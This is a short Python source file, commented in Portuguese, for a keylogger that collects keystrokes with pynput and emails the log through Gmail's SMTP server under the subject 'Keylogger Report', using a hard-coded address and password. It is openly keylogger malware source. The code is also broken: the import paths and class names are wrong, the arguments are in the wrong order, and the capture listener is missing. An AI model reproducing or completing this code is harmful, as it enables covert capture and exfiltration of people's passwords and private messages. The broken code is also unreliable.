from pynput import keyboard
import smtplib
from email.mine.text import mimetext
from threading import timer

#configuracoes de e-mail
EMAIL_ORIGEM ="demokeylogger@gmail.com"
EMAIL_DESTINO ="demokeylogger@gmail.com"
SENHA_EMAIL = "1237654@GATO"

def enviar_email():
    global log 
    if log:
        msg = mimetext("plain", log)
        msg["Subject"] = "Keylogger Report"
        msg["From"] = EMAIL_ORIGEM
        msg["To"] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.sendmail(EMAIL_ORIGEM, EMAIL_DESTINO, msg.as_string())
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar e-mail: {e}")
        
        log = ""